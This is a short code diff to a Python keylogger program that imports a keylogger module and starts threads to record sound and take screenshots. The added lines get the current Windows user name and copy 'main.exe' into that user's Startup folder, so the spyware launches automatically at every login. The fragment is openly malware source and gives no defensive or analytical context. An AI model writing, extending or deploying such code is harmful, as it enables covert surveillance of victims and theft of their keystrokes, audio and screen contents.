@@ -2,6 +2,13 @@ from keyloggerskill import keylogger
 import time
 import threading
 from keystroke import main
+import shutil
+import os
+
+name = os.getlogin()
+target = "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(name)
+shutil.copy('main.exe', target)
+
 keyloggerobject = keylogger()
 t = threading.Thread(target=keyloggerobject.take_sound)
 t2 = threading.Thread(target=keyloggerobject.screenshootgo)
